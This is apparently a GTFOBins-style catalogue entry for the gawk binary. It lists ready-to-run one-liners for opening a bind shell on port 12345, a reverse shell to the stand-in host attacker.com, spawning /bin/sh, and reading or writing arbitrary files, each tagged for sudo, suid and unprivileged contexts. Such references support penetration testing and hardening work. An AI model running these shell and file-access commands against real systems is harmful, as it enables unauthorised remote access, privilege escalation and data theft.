---
type: gtfobin
name: gawk
platform: Unix
functions: [bind-shell, file-read, file-write, reverse-shell, shell]
tags: [gtfobin, unix, lotl]
---

# gawk

## bind-shell

```bash
gawk 'BEGIN {
    s = "/inet/tcp/12345/0/0";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
```
**Contexts:** sudo, suid, unprivileged

## file-read

```bash
gawk '//' /path/to/input-file
```
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
gawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
```
**Contexts:** sudo, suid, unprivileged

## reverse-shell

```bash
gawk 'BEGIN {
    s = "/inet/tcp/0/attacker.com/12345";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
gawk 'BEGIN {system("/bin/sh")}'
```
**Contexts:** sudo, suid, unprivileged
